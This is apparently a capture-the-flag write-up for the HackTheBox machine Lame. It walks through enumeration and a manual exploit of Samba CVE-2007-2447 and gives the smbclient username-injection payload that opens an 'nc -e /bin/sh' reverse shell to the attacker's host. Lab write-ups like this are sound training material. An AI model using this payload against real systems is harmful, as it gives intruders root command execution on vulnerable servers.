---
layout: post
title: "HackTheBox — Lame (HTB Classic)"
date: 2026-09-01 00:00:00 +0700
category: writeups
platform: "HackTheBox"
difficulty: "Easy"
tags: [htb, smb, metasploit, linux, samba]
description: "Rooting Lame via the classic Samba usermap_script CVE-2007-2447 without Metasploit."
---

## Overview

**Machine:** Lame  
**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**IP:** `10.10.10.3`

---

## Enumeration

### Port Scan

```bash
rustscan -a 10.10.10.3 --ulimit 5000 -- -sV -sC -oN lame.nmap
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21   | open  | ftp     | vsftpd 2.3.4 |
| 22   | open  | ssh     | OpenSSH 4.7p1 |
| 139  | open  | netbios-smb | Samba 3.x |
| 445  | open  | microsoft-ds | Samba 3.0.20 |
| 3632 | open  | distccd | distccd v1 |

### FTP Enumeration

```bash
ftp 10.10.10.3
# Anonymous login allowed — nothing useful found
```

vsftpd 2.3.4 is notorious for a backdoor (CVE-2011-2523), but the patch was applied on this box.

### SMB Enumeration

```bash
enum4linux -a 10.10.10.3
smbclient -L //10.10.10.3 -N
```

SMB is running **Samba 3.0.20**, which is vulnerable to **CVE-2007-2447** — the `username map script` command injection.

---

## Exploitation

### CVE-2007-2447 — Samba usermap_script

This vulnerability allows command injection through the username field when SMB is configured with `username map script`. We pass a shell command as the username.

**Manual exploit without Metasploit:**

```bash
# Start listener
nc -lvnp 4444
```

```bash
# Trigger the injection via smbclient
smbclient //10.10.10.3/tmp \
  -U "./=`nohup nc -e /bin/sh 10.10.14.X 4444`"
```

> **Note:** The backtick payload in the username triggers command execution server-side via the script handler.

We get a shell back as `root` — this machine runs the SMB service as root, so no privilege escalation needed.

---

## Flags

```
user.txt  → /home/makis/user.txt
root.txt  → /root/root.txt
```

---

## Lessons Learned

- Always check SMB version — old Samba releases are goldmines
- `username map script` is a dangerous Samba config option
- Rustscan + nmap combo is faster than nmap alone for initial recon

---

## References

- [CVE-2007-2447 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- [Rapid7 Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
